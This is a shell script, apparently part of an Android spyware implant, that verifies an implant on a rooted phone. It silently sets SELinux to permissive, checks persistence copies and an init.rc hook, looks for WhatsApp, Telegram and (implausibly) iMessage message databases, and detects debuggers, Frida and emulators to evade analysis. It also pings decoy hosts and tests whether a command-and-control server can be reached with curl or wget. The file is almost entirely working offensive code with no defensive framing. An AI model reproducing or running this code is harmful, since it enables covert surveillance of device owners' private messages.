# Implant verification and environment probe skeleton

ZC_ROOT="/data/local/zc"
ZC_SYSTEM="/system/etc/zc"
ZC_PERSIST="/persist/zc"
ZC_LOG="$ZC_ROOT/zc.log"
ZC_DB="$ZC_ROOT/state.db"
ZC_PRN_DB="$ZC_ROOT/prn_state.db"
ZC_PRN_LOG="$ZC_ROOT/prn.log"
ZC_MARKER="$ZC_ROOT/.implanted"
ZC_VERSION="1.0"
ZC_PROBE_PATHS="/system /persist /vendor /product /data /sdcard"
ZC_PROBE_BINS="sh bash toybox busybox openssl sqlite3 curl wget"
ZC_CHECK_HOSTS="androidupdate.com msn.com"

zc_prn_log() {
  local msg="$1"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
  echo "[$ts] $msg" >> "$ZC_PRN_LOG" 2>/dev/null
}

zc_prn_init_dirs() {
  mkdir -p "$ZC_ROOT" 2>/dev/null
  chmod 700 "$ZC_ROOT" 2>/dev/null
  zc_prn_log "prn dirs initialized"
}

zc_prn_init_db() {
  if [ ! -f "$ZC_PRN_DB" ]; then
    echo "CREATE TABLE probes (id TEXT PRIMARY KEY, value TEXT, status TEXT, ts TEXT);" | sqlite3 "$ZC_PRN_DB" 2>/dev/null
    echo "CREATE TABLE prn_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_PRN_DB" 2>/dev/null
    zc_prn_log "prn db initialized"
  fi
}

zc_prn_state_set() {
  local key="$1"
  local value="$2"
  echo "INSERT OR REPLACE INTO prn_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_PRN_DB" 2>/dev/null
}

zc_prn_state_get() {
  local key="$1"
  sqlite3 "$ZC_PRN_DB" "SELECT value FROM prn_state WHERE key='$key';" 2>/dev/null
}

zc_prn_store() {
  local id="$1"
  local value="$2"
  local status="$3"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "INSERT OR REPLACE INTO probes (id, value, status, ts) VALUES ('$id', '$value', '$status', '$ts');" | sqlite3 "$ZC_PRN_DB" 2>/dev/null
}

zc_prn_get() {
  local id="$1"
  sqlite3 "$ZC_PRN_DB" "SELECT value FROM probes WHERE id='$id';" 2>/dev/null
}

zc_prn_get_status() {
  local id="$1"
  sqlite3 "$ZC_PRN_DB" "SELECT status FROM probes WHERE id='$id';" 2>/dev/null
}

zc_prn_echo() {
  local tag="$1"
  local msg="$2"
  echo "[$tag] $msg"
  zc_prn_log "$tag: $msg"
}

zc_prn_check_root() {
  local uid
  uid=$(id -u 2>/dev/null)
  if [ "$uid" = "0" ]; then
    zc_prn_echo "root" "ok"
    zc_prn_store "root" "$uid" "ok"
    return 0
  fi
  zc_prn_echo "root" "fail uid=$uid"
  zc_prn_store "root" "$uid" "fail"
  return 1
}

zc_prn_check_selinux() {
  local mode
  mode=$(getenforce 2>/dev/null)
  if [ -z "$mode" ]; then
    mode="unknown"
  fi
  zc_prn_echo "selinux" "$mode"
  zc_prn_store "selinux" "$mode" "ok"
  if [ "$mode" = "Enforcing" ]; then
    setenforce 0 2>/dev/null
    zc_prn_echo "selinux" "set permissive"
  fi
  return 0
}

zc_prn_check_arch() {
  local arch
  arch=$(uname -m 2>/dev/null)
  if [ -z "$arch" ]; then
    arch="unknown"
  fi
  zc_prn_echo "arch" "$arch"
  zc_prn_store "arch" "$arch" "ok"
}

zc_prn_check_kernel() {
  local kernel
  kernel=$(uname -r 2>/dev/null)
  if [ -z "$kernel" ]; then
    kernel="unknown"
  fi
  zc_prn_echo "kernel" "$kernel"
  zc_prn_store "kernel" "$kernel" "ok"
}

zc_prn_check_android() {
  local release
  local sdk
  release=$(getprop ro.build.version.release 2>/dev/null)
  sdk=$(getprop ro.build.version.sdk 2>/dev/null)
  if [ -z "$release" ]; then
    release="unknown"
  fi
  if [ -z "$sdk" ]; then
    sdk="unknown"
  fi
  zc_prn_echo "android" "release=$release sdk=$sdk"
  zc_prn_store "android_release" "$release" "ok"
  zc_prn_store "android_sdk" "$sdk" "ok"
}

zc_prn_check_device() {
  local model
  local brand
  model=$(getprop ro.product.model 2>/dev/null)
  brand=$(getprop ro.product.brand 2>/dev/null)
  if [ -z "$model" ]; then
    model="unknown"
  fi
  if [ -z "$brand" ]; then
    brand="unknown"
  fi
  zc_prn_echo "device" "brand=$brand model=$model"
  zc_prn_store "device_brand" "$brand" "ok"
  zc_prn_store "device_model" "$model" "ok"
}

zc_prn_check_path() {
  local path="$1"
  if [ -d "$path" ]; then
    zc_prn_echo "path" "$path exists"
    zc_prn_store "path_$path" "$path" "ok"
    return 0
  fi
  zc_prn_echo "path" "$path missing"
  zc_prn_store "path_$path" "$path" "fail"
  return 1
}

zc_prn_check_paths() {
  local p
  for p in $ZC_PROBE_PATHS; do
    zc_prn_check_path "$p"
  done
}

zc_prn_check_bin() {
  local bin="$1"
  if command -v "$bin" >/dev/null 2>&1; then
    zc_prn_echo "bin" "$bin ok"
    zc_prn_store "bin_$bin" "$bin" "ok"
    return 0
  fi
  zc_prn_echo "bin" "$bin missing"
  zc_prn_store "bin_$bin" "$bin" "fail"
  return 1
}

zc_prn_check_bins() {
  local b
  for b in $ZC_PROBE_BINS; do
    zc_prn_check_bin "$b"
  done
}

zc_prn_check_mount() {
  local part="$1"
  local mode
  mode=$(mount 2>/dev/null | grep " $part " | awk '{print $6}' | head -n 1)
  if [ -z "$mode" ]; then
    mode="not-mounted"
  fi
  zc_prn_echo "mount" "$part $mode"
  zc_prn_store "mount_$part" "$mode" "ok"
}

zc_prn_check_mounts() {
  zc_prn_check_mount /system
  zc_prn_check_mount /persist
  zc_prn_check_mount /vendor
  zc_prn_check_mount /product
  zc_prn_check_mount /data
}

zc_prn_check_write() {
  local path="$1"
  local testfile="$path/.zc_prn_test"
  if touch "$testfile" 2>/dev/null; then
    rm -f "$testfile" 2>/dev/null
    zc_prn_echo "write" "$path ok"
    zc_prn_store "write_$path" "$path" "ok"
    return 0
  fi
  zc_prn_echo "write" "$path fail"
  zc_prn_store "write_$path" "$path" "fail"
  return 1
}

zc_prn_check_write_all() {
  zc_prn_check_write "$ZC_ROOT"
  zc_prn_check_write /data/local/tmp
}

zc_prn_check_network() {
  local host
  local ok=0
  for host in $ZC_CHECK_HOSTS; do
    if ping -c 1 -W 2 "$host" >/dev/null 2>&1; then
      zc_prn_echo "net" "$host ok"
      zc_prn_store "net_$host" "$host" "ok"
      ok=$((ok + 1))
    else
      zc_prn_echo "net" "$host fail"
      zc_prn_store "net_$host" "$host" "fail"
    fi
  done
  if [ "$ok" -gt 0 ]; then
    return 0
  fi
  return 1
}

zc_prn_check_dns() {
  local host="androidupdate.com"
  if command -v nslookup >/dev/null 2>&1; then
    nslookup "$host" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      zc_prn_echo "dns" "ok"
      zc_prn_store "dns" "ok" "ok"
      return 0
    fi
  fi
  zc_prn_echo "dns" "fail"
  zc_prn_store "dns" "fail" "fail"
  return 1
}

zc_prn_check_rc_exec() {
  local marker="$ZC_MARKER"
  if [ -f "$marker" ]; then
    local ts
    ts=$(cat "$marker" 2>/dev/null)
    zc_prn_echo "rc" "already executed at $ts"
    zc_prn_store "rc_exec" "$ts" "ok"
    return 0
  fi
  date +"%Y-%m-%d %H:%M:%S" > "$marker" 2>/dev/null
  zc_prn_echo "rc" "first execution"
  zc_prn_store "rc_exec" "first" "ok"
  return 0
}

zc_prn_check_persist_system() {
  local f="$ZC_SYSTEM/Printer.sh"
  if [ -f "$f" ]; then
    zc_prn_echo "persist" "system ok"
    zc_prn_store "persist_system" "$f" "ok"
    return 0
  fi
  zc_prn_echo "persist" "system missing"
  zc_prn_store "persist_system" "$f" "fail"
  return 1
}

zc_prn_check_persist_persist() {
  local f="$ZC_PERSIST/Printer.sh"
  if [ -f "$f" ]; then
    zc_prn_echo "persist" "persist ok"
    zc_prn_store "persist_persist" "$f" "ok"
    return 0
  fi
  zc_prn_echo "persist" "persist missing"
  zc_prn_store "persist_persist" "$f" "fail"
  return 1
}

zc_prn_check_persist_all() {
  zc_prn_check_persist_system
  zc_prn_check_persist_persist
}

zc_prn_check_init_hook() {
  local init_rc="/system/etc/init/hw/init.rc"
  if [ ! -f "$init_rc" ]; then
    init_rc="/init.rc"
  fi
  if [ ! -f "$init_rc" ]; then
    zc_prn_echo "init" "not found"
    zc_prn_store "init_hook" "not-found" "fail"
    return 1
  fi
  if grep -q "zc" "$init_rc" 2>/dev/null; then
    zc_prn_echo "init" "hook present"
    zc_prn_store "init_hook" "present" "ok"
    return 0
  fi
  zc_prn_echo "init" "hook missing"
  zc_prn_store "init_hook" "missing" "fail"
  return 1
}

zc_prn_check_app_db() {
  local app="$1"
  local db_path="$2"
  if [ -f "$db_path" ]; then
    zc_prn_echo "appdb" "$app ok"
    zc_prn_store "appdb_$app" "$db_path" "ok"
    return 0
  fi
  zc_prn_echo "appdb" "$app missing"
  zc_prn_store "appdb_$app" "$db_path" "fail"
  return 1
}

zc_prn_check_app_dbs() {
  zc_prn_check_app_db "imessage" "/data/data/com.apple.messages/databases/chat.db"
  zc_prn_check_app_db "telegram" "/data/data/com.telegram.messenger/files/cache4.db"
  zc_prn_check_app_db "whatsapp" "/data/data/com.whatsapp/databases/msgstore.db"
}

zc_prn_check_c2_reachable() {
  local c2="$1"
  if [ -z "$c2" ]; then
    zc_prn_echo "c2" "no c2 configured"
    zc_prn_store "c2_reachable" "none" "fail"
    return 1
  fi
  local code
  if command -v curl >/dev/null 2>&1; then
    code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "https://$c2" 2>/dev/null)
  elif command -v wget >/dev/null 2>&1; then
    wget -q -T 5 -O /dev/null "https://$c2" 2>/dev/null && code="200"
  fi
  if [ -z "$code" ]; then
    code="000"
  fi
  zc_prn_echo "c2" "$c2 code=$code"
  zc_prn_store "c2_reachable" "$code" "ok"
  if [ "$code" = "200" ]; then
    return 0
  fi
  return 1
}

zc_prn_check_debug() {
  local tracer
  tracer=$(cat /proc/self/status 2>/dev/null | grep TracerPid | awk '{print $2}')
  if [ -z "$tracer" ]; then
    tracer="0"
  fi
  zc_prn_echo "debug" "tracerpid=$tracer"
  zc_prn_store "debug" "$tracer" "ok"
  if [ "$tracer" != "0" ]; then
    return 0
  fi
  return 1
}

zc_prn_check_frida() {
  local ports="27042 27043"
  local p
  for p in $ports; do
    if command -v netstat >/dev/null 2>&1; then
      if netstat -tunlp 2>/dev/null | grep -q ":$p "; then
        zc_prn_echo "frida" "port $p"
        zc_prn_store "frida" "$p" "fail"
        return 0
      fi
    fi
  done
  zc_prn_echo "frida" "clean"
  zc_prn_store "frida" "clean" "ok"
  return 1
}

zc_prn_check_emulator() {
  local props
  props=$(getprop 2>/dev/null)
  if echo "$props" | grep -qE "goldfish|ranchu|genymotion|emulator"; then
    zc_prn_echo "emulator" "detected"
    zc_prn_store "emulator" "detected" "fail"
    return 0
  fi
  zc_prn_echo "emulator" "clean"
  zc_prn_store "emulator" "clean" "ok"
  return 1
}

zc_prn_summary() {
  local total
  local ok
  local fail
  total=$(sqlite3 "$ZC_PRN_DB" "SELECT COUNT(*) FROM probes;" 2>/dev/null)
  ok=$(sqlite3 "$ZC_PRN_DB" "SELECT COUNT(*) FROM probes WHERE status='ok';" 2>/dev/null)
  fail=$(sqlite3 "$ZC_PRN_DB" "SELECT COUNT(*) FROM probes WHERE status='fail';" 2>/dev/null)
  if [ -z "$total" ]; then
    total=0
  fi
  if [ -z "$ok" ]; then
    ok=0
  fi
  if [ -z "$fail" ]; then
    fail=0
  fi
  zc_prn_echo "summary" "total=$total ok=$ok fail=$fail"
  zc_prn_store "summary_total" "$total" "ok"
  zc_prn_store "summary_ok" "$ok" "ok"
  zc_prn_store "summary_fail" "$fail" "ok"
  echo "$total $ok $fail"
}

zc_prn_report() {
  local line
  while IFS= read -r line; do
    if [ -z "$line" ]; then
      continue
    fi
    echo "$line"
  done <<EOF
$(sqlite3 "$ZC_PRN_DB" "SELECT id, value, status FROM probes ORDER BY id;" 2>/dev/null)
EOF
}

zc_prn_export() {
  local out="$1"
  if [ -z "$out" ]; then
    out="$ZC_ROOT/prn_report.txt"
  fi
  zc_prn_report > "$out" 2>/dev/null
  zc_prn_echo "export" "$out"
}

zc_prn_cleanup() {
  rm -f "$ZC_ROOT/.zc_prn_test" 2>/dev/null
  zc_prn_log "cleanup done"
}

zc_prn_self_test() {
  if [ "$(id -u)" = "0" ]; then
    zc_prn_log "self test root ok"
  fi
  if [ -d "$ZC_ROOT" ]; then
    zc_prn_log "self test dir ok"
  fi
  zc_prn_log "self test passed"
  return 0
}

zc_prn_status() {
  echo "ZC prn version: $ZC_VERSION"
  echo "root: $(id -u)"
  echo "selinux: $(getenforce 2>/dev/null)"
  echo "marker: $ZC_MARKER"
  echo "probes: $(sqlite3 "$ZC_PRN_DB" "SELECT COUNT(*) FROM probes;" 2>/dev/null)"
  echo "prn db: $ZC_PRN_DB"
  echo "prn log: $ZC_PRN_LOG"
}

zc_prn_main() {
  zc_prn_log "Printer.sh start"
  zc_prn_init_dirs
  zc_prn_init_db
  zc_prn_state_set "version" "$ZC_VERSION"
  zc_prn_check_rc_exec
  zc_prn_check_root
  zc_prn_check_selinux
  zc_prn_check_arch
  zc_prn_check_kernel
  zc_prn_check_android
  zc_prn_check_device
  zc_prn_check_paths
  zc_prn_check_bins
  zc_prn_check_mounts
  zc_prn_check_write_all
  zc_prn_check_network
  zc_prn_check_dns
  zc_prn_check_persist_all
  zc_prn_check_init_hook
  zc_prn_check_app_dbs
  zc_prn_check_debug
  zc_prn_check_frida
  zc_prn_check_emulator
  zc_prn_summary
  zc_prn_export
  zc_prn_status
  zc_prn_log "Printer.sh done"
}

case "$1" in
  start)
    zc_prn_main
    ;;
  check)
    zc_prn_check_root
    zc_prn_check_selinux
    zc_prn_check_network
    ;;
  paths)
    zc_prn_check_paths
    ;;
  bins)
    zc_prn_check_bins
    ;;
  mounts)
    zc_prn_check_mounts
    ;;
  write)
    zc_prn_check_write_all
    ;;
  persist)
    zc_prn_check_persist_all
    ;;
  appdb)
    zc_prn_check_app_dbs
    ;;
  debug)
    zc_prn_check_debug
    zc_prn_check_frida
    zc_prn_check_emulator
    ;;
  summary)
    zc_prn_summary
    ;;
  report)
    zc_prn_report
    ;;
  export)
    zc_prn_export "$2"
    ;;
  selftest)
    zc_prn_self_test
    ;;
  status)
    zc_prn_status
    ;;
  *)
    zc_prn_main
    ;;
esac

exit 0